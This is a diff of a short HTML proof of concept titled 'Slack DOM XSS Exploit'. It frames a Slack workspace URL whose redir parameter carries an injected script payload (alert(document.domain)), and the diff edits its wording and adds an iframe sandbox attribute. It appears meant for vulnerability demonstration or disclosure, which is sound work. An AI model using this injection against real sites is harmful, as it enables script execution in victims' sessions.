@@ -1,14 +1,13 @@
 <!DOCTYPE html>
 <html>
-<head>
-    <title>Faizan's XSS PoC</title>
-</head>
 <body>
     <h1>Slack DOM XSS Exploit</h1>
-    <p>Niche wale link par click karein (This simulates a victim clicking a link in a frame):</p>
-    
-    <iframe src="https://nitrotoken.slack.com/?redir=test';alert(document.domain);'" 
-            style="width:500px; height:300px; border:1px solid red;">
+    <p>Click the link below to trigger the vulnerability:</p>
+
+    <iframe 
+        sandbox="allow-forms allow-scripts allow-same-origin"
+        src="https://nitrotoken.slack.com/?redir=test';alert(document.domain);'" 
+        style="width:500px; height:300px;">
     </iframe>
 </body>
 </html>
